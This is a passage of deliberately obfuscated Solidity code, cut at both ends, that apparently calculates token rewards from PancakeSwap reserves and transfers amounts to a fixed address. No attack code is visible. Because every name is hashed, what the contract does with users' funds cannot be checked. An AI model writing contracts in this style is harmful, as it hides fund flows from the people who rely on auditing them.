Oxfcb94671f022535626f1f8fdab1759ec103f18e95c4247acd3385dfccfd5bf5c494565844ebc8c32b6f23c26a69ba4fb8f0fa9819f655e16deb75c90ba91a6c4(Ox3bd07d31c9f2d7f2b0547ca04574a6e46e13b2fdd7b625592b342c521ce90e02d3c4bc0e945ceff2e4c3e59f718e5cf954f14227959e98d969cd710187880d17, Oxe9dc5505135fbedc8cb7c52d088733a2899d79cd0713cf2b0f77d5a0f00345744acd9df92f23319b9768f6565e0902ce1b9508bd0069a70bc0901d42821885bd, Ox5dcbd289b28e44be231b1d27085b832794cc06b99f3ce28e32c98b302e2beaa3ffbf014bdbfed2ae34a56471fa9190ad14b8ed09cddc41f5d00dc5207d189e2f, Oxa1d4a72086d60b334f81730a786f5b06dbfe12fa0321b515e15dcbc46e4556b40bcd1527f9a655dc570dcc571e783d43b8844ae016bfd3d1aff471ce691caaad, sgoTOx6b41e88162d9a358ab1fdad41ece647c88628e5287f05eae8d5e83099e873fd7e7c0e2c7133b0f7a9db204cb3457ab8d2b7e5d7be8096738aa08df7f1bc71882, Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox9a0e019788dde2c1ebb143ffd89bb6b778c19e406198588d876c35c8e93cd7c95f742b17e42cad316992e4ececad8185978015b591e8aee77737bd4cd1396e8a, Oxf1df217c327f7e6dbb21de2d6c6e59449a134c4af6f621e0fc9b4b15e5a363a85b11af380cbf56df1b8789cf19d39415ee522baffbe886a3a10193f4679d686a, Oxd9ec526e2016b9574dc74cadcd3539a8c07cfa1a15e36b325209a9578d3287f6b8c28e66895e840be586b9415d4d0e37c87bc1cfdd937f0436819389b5efb879);}}function Ox967c9d0fcb68a98de229343a719d7777147b85fed70ec1bf12b57164c4e9e0f8724602f2092b2b1b457a307aec55a7395a5c5e2e281694d239500de3a2dc3f3b (uint256 Oxf33dd9e5854a03c0cf9a21e2ce6e2602b98ce7976d067f2c06b15954Oxbd54af4c3fb3b7b88c6a88d581e2c9f467a2532cdff048d59c699ccaa944d20e111825634180d5c5ec621933d3c21c2eb67ce4bf01e52280f1bcbd663eab69f2cbebc5a64f257b92bf967a415f22d0d464625ac9b6dabad4d980d9333b72ffd8c87f8, address Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a) internal{uint256 Ox22687a9982b78b8e438dbaa03d551a3c252bd3ae18e6ccbfe26e88ed10ae0eea1c8eb0cc4ee3f4424bcd8314ac1c1bf611b4ec0c5afa26525bb5db27cbc9ae4d = Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a].Ox0e3d5a2c06f8e469a9fc2f9c4cf2ff01ec9ef963081969cbb82a1b175c545084196195271f8be396ef63a71eadb3697b4e4514cf4c084f274996acd02d0fc181;uint256 Ox5dcbd289b28e44be231b1d27085b832794cc06b99f3ce28e32c98b302e2beaa3ffbf014bdbfed2ae34a56471fa9190ad14b8ed09cddc41f5d00dc5207d189e2f;uint256 Oxd9ec526e2016b9574dc74cadcd3539a8c07cfa1a15e36b325209a9578d3287f6b8c28e66895e840be586b9415d4d0e37c87bc1cfdd937f0436819389b5efb879;IPancakeSwapPair Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078 = Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a].Oxf40c8b8eb4c8f9ba62daf8fae92b1a85e1c1fc94b0c0e03f6c98efe8a5b4372fc46193c9469304848bb09508908ce295f0ea1ca254052654ab997335ded7c827;uint256 Oxd3af883cd46ffafe5b734332eebd83266077aeffd2b43e89bc4e969b06f98be7670343e17279c3bc92617ad895f57dad8cd7356678d581f505add04e4a7a590d;if(Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a].Oxb953b84b72910ff51545d316cf22f4f22e36bddf286746f0d5b4eb16bec15c46b92c8431dd8a47b612d7610fc5356ba085b00d137c2f3fa311b6eb8de42dfc86 > 0 && Oxf33dd9e5854a03c0cf9a21e2ce6e2602b98ce7976d067f2c06b15954Oxbd54af4c3fb3b7b88c6a88d581e2c9f467a2532cdff048d59c699ccaa944d20e111825634180d5c5ec621933d3c21c2eb67ce4bf01e52280f1bcbd663eab69f2cbebc5a64f257b92bf967a415f22d0d464625ac9b6dabad4d980d9333b72ffd8c87f8 == 0) {if(Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a].Ox25ac60a6ced7dd9cad804b6813939b022bd79181f9455c8ccb620725ed5528fc348781bb27c44ff3f41a236e7b969370830861c8d5926de958deded430edec84 != IPancakeSwapPair(Oxdaa0c942ac76bec8955822fdd0b02ab771c96b7d56fecfd5f16327342117ff73031f61fb22ffb4dd1ac44b19e663bd11871b59fe3bb6a25a6676083a9febde91)) {if(block.number > Ox2c8c0c56e8f34182bf27eb23aa6b29191c4b95233d35e2bc856e158a60c460355b6c48588b0615ad2ce7f82c921b7e771e7183bd0eff3cbffe3358382a862f35[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a]) {Ox2c8c0c56e8f34182bf27eb23aa6b29191c4b95233d35e2bc856e158a60c460355b6c48588b0615ad2ce7f82c921b7e771e7183bd0eff3cbffe3358382a862f35[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a] = block.number+Ox2bb0f640b8e2d5bd0b1cac1bae18d8b6c2a2d7739caf071dc07ebf529eb493ca1658495b091b7b09ab6f3abad3a2827f4b3fa9f6b5c2d3a584b6be4cea5282f7;Ox5dcbd289b28e44be231b1d27085b832794cc06b99f3ce28e32c98b302e2beaa3ffbf014bdbfed2ae34a56471fa9190ad14b8ed09cddc41f5d00dc5207d189e2f = Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a].Ox0a5a11a5463979f02464c98b7ca5a23edf1d2389dc9620012874ee8d473bb6d8ddf02f8f384622762063dab1806da28df8e84d8e1f215a61c2a5254b37864774 = ((Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a].Ox0a5a11a5463979f02464c98b7ca5a23edf1d2389dc9620012874ee8d473bb6d8ddf02f8f384622762063dab1806da28df8e84d8e1f215a61c2a5254b37864774*(Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox9a0e019788dde2c1ebb143ffd89bb6b778c19e406198588d876c35c8e93cd7c95f742b17e42cad316992e4ececad8185978015b591e8aee77737bd4cd1396e8a-1))+Ox29110b8a9596d8ea5bb4724ce5d77e7b56e9b0d3ee401cb5215583ba78ede73508da06029e9d819868bf9dca0a2f56343f6ad44cef45c7b3da800c18b6137ae1(Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a))/Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox9a0e019788dde2c1ebb143ffd89bb6b778c19e406198588d876c35c8e93cd7c95f742b17e42cad316992e4ececad8185978015b591e8aee77737bd4cd1396e8a;}} else Ox5dcbd289b28e44be231b1d27085b832794cc06b99f3ce28e32c98b302e2beaa3ffbf014bdbfed2ae34a56471fa9190ad14b8ed09cddc41f5d00dc5207d189e2f = Ox699021221729738a1359b2f94cc1367d13af6beb83e699971c7371361cca2b1708480b00812422ca3b4d5339ea577f080945a42ed06d5190aecd729e9886f18a(Oxf67aa57b930ceef65c47471af7cfe9a8fc89d11ce3de491d6e1f1f631fe7399d745e0ab7b38ce6a18346f9f08bdadd3b1ecfae06611c8afedb88badc65ad8f4e);if(Ox5dcbd289b28e44be231b1d27085b832794cc06b99f3ce28e32c98b302e2beaa3ffbf014bdbfed2ae34a56471fa9190ad14b8ed09cddc41f5d00dc5207d189e2f > 0 && Ox22687a9982b78b8e438dbaa03d551a3c252bd3ae18e6ccbfe26e88ed10ae0eea1c8eb0cc4ee3f4424bcd8314ac1c1bf611b4ec0c5afa26525bb5db27cbc9ae4d > 0) {address Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f = Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078.token0();address Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c = Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078.token1();address Ox3740f4474ace52b00c2eb2cf24Oxbd54af4c3fb3b7b88c6a88d581e2c9f467a2532cdff048d59c699ccaa944d20e111825634180d5c5ec621933d3c21c2eb67ce4bf01e52280f1bcbd663eab69f2f61d040d4a7c8eb3e1a86d6ca7097cde72b59142d2eec73d76c96dc100d1b986d8bab6642dd32e9b25cf90065c4a5e832b8 = Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c;(Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f, Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c) = Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f < Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c ? (Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f, Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c) : (Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c, Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f);(uint Ox5de11c54759ea2012ca3550d146d96766b70fc5d79ce88af54b8f2c5757b56ff4949242b3d3fc2bf1b637b11ce4cb56f1f58ed85ad48aae7db1721c0b5f5b42d, uint Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08,) = Oxa25e203c62e54787a7d24df2b6841ff49be0b8abc5764cfcdcfd3000a2e6aa7477d74b65f1aa1ebf0b1c05f7bdc775f610402b13aaf142108097322f20115078.getReserves();(Ox5de11c54759ea2012ca3550d146d96766b70fc5d79ce88af54b8f2c5757b56ff4949242b3d3fc2bf1b637b11ce4cb56f1f58ed85ad48aae7db1721c0b5f5b42d, Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08, Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f, Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c) = Ox3740f4474ace52b00c2eb2cf24Oxbd54af4c3fb3b7b88c6a88d581e2c9f467a2532cdff048d59c699ccaa944d20e111825634180d5c5ec621933d3c21c2eb67ce4bf01e52280f1bcbd663eab69f2f61d040d4a7c8eb3e1a86d6ca7097cde72b59142d2eec73d76c96dc100d1b986d8bab6642dd32e9b25cf90065c4a5e832b8 == Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c && Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c == address(this) ? (Ox5de11c54759ea2012ca3550d146d96766b70fc5d79ce88af54b8f2c5757b56ff4949242b3d3fc2bf1b637b11ce4cb56f1f58ed85ad48aae7db1721c0b5f5b42d, Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08, Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f, Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c) : (Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08, Ox5de11c54759ea2012ca3550d146d96766b70fc5d79ce88af54b8f2c5757b56ff4949242b3d3fc2bf1b637b11ce4cb56f1f58ed85ad48aae7db1721c0b5f5b42d, Ox2669a2607a3a352ce41e72f18ec913bdfa8dbadcb4aab24dcdc50f02ee849832aa79b52057d4907d8acb62df948fddf1ebdf3c7f598f0a652e421882b2e5a64c, Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f);uint256 Oxb953b84b72910ff51545d316cf22f4f22e36bddf286746f0d5b4eb16bec15c46b92c8431dd8a47b612d7610fc5356ba085b00d137c2f3fa311b6eb8de42dfc86 = Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a].Oxb953b84b72910ff51545d316cf22f4f22e36bddf286746f0d5b4eb16bec15c46b92c8431dd8a47b612d7610fc5356ba085b00d137c2f3fa311b6eb8de42dfc86;   if(Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08 < 200 * 1e18 || Ox73b0881cba1a0ad8c1544e74159c99087148a26115d1aee5133e45a5f0429845b400e6198cc0e6568156045ff9bffaa6ef70fa3b678a17dfcb49ca008bd4cb7e(1e18) < Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox562e39742b68b36af3d251b2be5a0466520ce20cd90b77edd2e1c61ae4fd09942bc5e9666aab4b50c1ab293ad7a07a125e99c7dd851e4685ebd47430a6971d27) Oxb953b84b72910ff51545d316cf22f4f22e36bddf286746f0d5b4eb16bec15c46b92c8431dd8a47b612d7610fc5356ba085b00d137c2f3fa311b6eb8de42dfc86 = 0;else if(Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08 < 1000 * 1e18) Oxb953b84b72910ff51545d316cf22f4f22e36bddf286746f0d5b4eb16bec15c46b92c8431dd8a47b612d7610fc5356ba085b00d137c2f3fa311b6eb8de42dfc86 = (Oxb953b84b72910ff51545d316cf22f4f22e36bddf286746f0d5b4eb16bec15c46b92c8431dd8a47b612d7610fc5356ba085b00d137c2f3fa311b6eb8de42dfc86 * 700) / 1000;Oxd3af883cd46ffafe5b734332eebd83266077aeffd2b43e89bc4e969b06f98be7670343e17279c3bc92617ad895f57dad8cd7356678d581f505add04e4a7a590d = (Ox5de11c54759ea2012ca3550d146d96766b70fc5d79ce88af54b8f2c5757b56ff4949242b3d3fc2bf1b637b11ce4cb56f1f58ed85ad48aae7db1721c0b5f5b42d* (1e18/Oxb023b4a4990e9601c5cd7c85127b46de61bbac711141fdffbc6485a973530a12a8c82d2a890262f4720a90fbe9ea7cbb9116a5f549e4cf8d52f98210bc69ac5c[Ox18df5a2ec347b79f5ffc4833423e005b035bd07c261c9e79d7751cf72deb1e006e15488c7f5f96e5eb1688caf7071886418281f10c2adbd7ee744eaf784cde1f]) * Ox5dcbd289b28e44be231b1d27085b832794cc06b99f3ce28e32c98b302e2beaa3ffbf014bdbfed2ae34a56471fa9190ad14b8ed09cddc41f5d00dc5207d189e2f) / Ox22687a9982b78b8e438dbaa03d551a3c252bd3ae18e6ccbfe26e88ed10ae0eea1c8eb0cc4ee3f4424bcd8314ac1c1bf611b4ec0c5afa26525bb5db27cbc9ae4d;if(Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08 > Oxd3af883cd46ffafe5b734332eebd83266077aeffd2b43e89bc4e969b06f98be7670343e17279c3bc92617ad895f57dad8cd7356678d581f505add04e4a7a590d) Oxd3af883cd46ffafe5b734332eebd83266077aeffd2b43e89bc4e969b06f98be7670343e17279c3bc92617ad895f57dad8cd7356678d581f505add04e4a7a590d = ((Oxed9f6dafbe273a9fdd036daf5a7ab61a91a2899fc4f382add287f34449adc3aae450d0f73670f5fdacf526595a46687c2a3bd83c0024862df99b8a31b4353f08 - Oxd3af883cd46ffafe5b734332eebd83266077aeffd2b43e89bc4e969b06f98be7670343e17279c3bc92617ad895f57dad8cd7356678d581f505add04e4a7a590d) * Oxb953b84b72910ff51545d316cf22f4f22e36bddf286746f0d5b4eb16bec15c46b92c8431dd8a47b612d7610fc5356ba085b00d137c2f3fa311b6eb8de42dfc86) / 1000;else Oxd3af883cd46ffafe5b734332eebd83266077aeffd2b43e89bc4e969b06f98be7670343e17279c3bc92617ad895f57dad8cd7356678d581f505add04e4a7a590d = 0;Oxd3af883cd46ffafe5b734332eebd83266077aeffd2b43e89bc4e969b06f98be7670343e17279c3bc92617ad895f57dad8cd7356678d581f505add04e4a7a590d = Oxde3b6827f95b27514300f36b857ca81acd602c9f112e2c106920ac10d613acf09e24b8f947cf6fc05bf2b8a6bd030c9a63eaa87223371d585f4c484fd6878105(Oxd3af883cd46ffafe5b734332eebd83266077aeffd2b43e89bc4e969b06f98be7670343e17279c3bc92617ad895f57dad8cd7356678d581f505add04e4a7a590d, Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a);}if(Oxd3af883cd46ffafe5b734332eebd83266077aeffd2b43e89bc4e969b06f98be7670343e17279c3bc92617ad895f57dad8cd7356678d581f505add04e4a7a590d > 0) Ox97ee5f7993f831c8ace6ade774bf499139899653a4bd3fdc52d5fb09e53308d05e1619ecca4d001ffb2ed2b2ade72bb4b5778972f239a1a4310f5f95547baef9(Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a, Ox56ea3c85383a69c4ff3f1157792fe864e068a75c1ab993a78ec50f0cca5b44211ffb0c1b308b0ed5e3b2b9d85a30830910528dd2d9d8f6e0ca660a011fa52aef, Oxd3af883cd46ffafe5b734332eebd83266077aeffd2b43e89bc4e969b06f98be7670343e17279c3bc92617ad895f57dad8cd7356678d581f505add04e4a7a590d);} else if(Oxf33dd9e5854a03c0cf9a21e2ce6e2602b98ce7976d067f2c06b15954Oxbd54af4c3fb3b7b88c6a88d581e2c9f467a2532cdff048d59c699ccaa944d20e111825634180d5c5ec621933d3c21c2eb67ce4bf01e52280f1bcbd663eab69f2cbebc5a64f257b92bf967a415f22d0d464625ac9b6dabad4d980d9333b72ffd8c87f8 != 0) {uint256 Oxd840ce30f88437e6538c1aba3924b222183f54da05b94befc4ad0e038d2f09f75e5bcf5c7c7e49da63b98f311edb257188d269f6ca4e63a24fb57824ad5976a0 = Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a].Oxd840ce30f88437e6538c1aba3924b222183f54da05b94befc4ad0e038d2f09f75e5bcf5c7c7e49da63b98f311edb257188d269f6ca4e63a24fb57824ad5976a0;uint256 Ox15f7703874bef6bd05d4536821da9a0f0fdddb106ef78c3515d3fa39ab6a1ef2b62186dada47ccec3b517a43fcdae831364c8e1c10dcbdfb12cf8a2167b5e0bf = Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a] / Ox9f445fecd48fcb879887c342f8e6fbec82ebe45bd08c8bfe9345f3ab5215b0b9c2b53cbe38ebe74208d98fd80e7ea2d7320d1a4e8ddd5c34c13a27fca897b606;if(Ox15f7703874bef6bd05d4536821da9a0f0fdddb106ef78c3515d3fa39ab6a1ef2b62186dada47ccec3b517a43fcdae831364c8e1c10dcbdfb12cf8a2167b5e0bf < 200 * 1e18 || Ox73b0881cba1a0ad8c1544e74159c99087148a26115d1aee5133e45a5f0429845b400e6198cc0e6568156045ff9bffaa6ef70fa3b678a17dfcb49ca008bd4cb7e(1e18) < Ox67789f3e901f4d0701d9f4ec09acb4837893c95104add12003bb862de1298d92d36abb0b576557c7eb2a3b5c4c3f66a826243d575e4b9f0cd39a09084ceac6dd.Ox562e39742b68b36af3d251b2be5a0466520ce20cd90b77edd2e1c61ae4fd09942bc5e9666aab4b50c1ab293ad7a07a125e99c7dd851e4685ebd47430a6971d27) Oxd840ce30f88437e6538c1aba3924b222183f54da05b94befc4ad0e038d2f09f75e5bcf5c7c7e49da63b98f311edb257188d269f6ca4e63a24fb57824ad5976a0 = 0;else if(Ox15f7703874bef6bd05d4536821da9a0f0fdddb106ef78c3515d3fa39ab6a1ef2b62186dada47ccec3b517a43fcdae831364c8e1c10dcbdfb12cf8a2167b5e0bf < 1000 * 1e18) Oxd840ce30f88437e6538c1aba3924b222183f54da05b94befc4ad0e038d2f09f75e5bcf5c7c7e49da63b98f311edb257188d269f6ca4e63a24fb57824ad5976a0 = (Oxd840ce30f88437e6538c1aba3924b222183f54da05b94befc4ad0e038d2f09f75e5bcf5c7c7e49da63b98f311edb257188d269f6ca4e63a24fb57824ad5976a0 * 700)/ 1000;uint256 delta = ((Ox15f7703874bef6bd05d4536821da9a0f0fdddb106ef78c3515d3fa39ab6a1ef2b62186dada47ccec3b517a43fcdae831364c8e1c10dcbdfb12cf8a2167b5e0bf - (Oxf8877e83b104ddae59351511d675b76b2a698c9723e97fa68c3350cda85c292276f2577ba249d644d70b7e5b854f14f35280bfa494eed50ded27f485d845dd57[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a] / Oxf33dd9e5854a03c0cf9a21e2ce6e2602b98ce7976d067f2c06b15954Oxbd54af4c3fb3b7b88c6a88d581e2c9f467a2532cdff048d59c699ccaa944d20e111825634180d5c5ec621933d3c21c2eb67ce4bf01e52280f1bcbd663eab69f2cbebc5a64f257b92bf967a415f22d0d464625ac9b6dabad4d980d9333b72ffd8c87f8)) * Oxd840ce30f88437e6538c1aba3924b222183f54da05b94befc4ad0e038d2f09f75e5bcf5c7c7e49da63b98f311edb257188d269f6ca4e63a24fb57824ad5976a0) / 1000;delta = Oxde3b6827f95b27514300f36b857ca81acd602c9f112e2c106920ac10d613acf09e24b8f947cf6fc05bf2b8a6bd030c9a63eaa87223371d585f4c484fd6878105(delta, Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a);if(delta>0 && !Oxdd65c71add8d31110845960c8917e55d8ffc5be16dda083b127618148ed0dafd846e59da613c4e11969927aa8086d053fd527c8d8767720c521caab402e6c76f && Oxd840ce30f88437e6538c1aba3924b222183f54da05b94befc4ad0e038d2f09f75e5bcf5c7c7e49da63b98f311edb257188d269f6ca4e63a24fb57824ad5976a0 > 0) Ox97ee5f7993f831c8ace6ade774bf499139899653a4bd3fdc52d5fb09e53308d05e1619ecca4d001ffb2ed2b2ade72bb4b5778972f239a1a4310f5f95547baef9(Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a, Ox56ea3c85383a69c4ff3f1157792fe864e068a75c1ab993a78ec50f0cca5b44211ffb0c1b308b0ed5e3b2b9d85a30830910528dd2d9d8f6e0ca660a011fa52aef, delta);Oxd9ec526e2016b9574dc74cadcd3539a8c07cfa1a15e36b325209a9578d3287f6b8c28e66895e840be586b9415d4d0e37c87bc1cfdd937f0436819389b5efb879 = 1;Ox5dcbd289b28e44be231b1d27085b832794cc06b99f3ce28e32c98b302e2beaa3ffbf014bdbfed2ae34a56471fa9190ad14b8ed09cddc41f5d00dc5207d189e2f = (Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a].Ox25ac60a6ced7dd9cad804b6813939b022bd79181f9455c8ccb620725ed5528fc348781bb27c44ff3f41a236e7b969370830861c8d5926de958deded430edec84 != IPancakeSwapPair(Oxdaa0c942ac76bec8955822fdd0b02ab771c96b7d56fecfd5f16327342117ff73031f61fb22ffb4dd1ac44b19e663bd11871b59fe3bb6a25a6676083a9febde91)) ? Ox9a567d6a2f2211f2d842f6952c7adafb31e6bc492179273e633af4f424d483326b2d6c257603620bd5bfa697875aec90e7fa31ba0bffe43e03fb96039758f79b[Ox42a90283d81df4ff7eb69a00382f6d7b131b553c1fa813995f615d29d1e965e5191bef86ea7bca2d2942a5bfd7b159e71bd0eb369f8b3b768e10188f7259d87a].Ox0a5a11a5463979f02464c98b7ca5a23edf1d2389dc9620012874ee8d473bb6d8ddf02f8f384622762063dab1806da28df8e84d8e1f215a61c2a5254b37864774 : 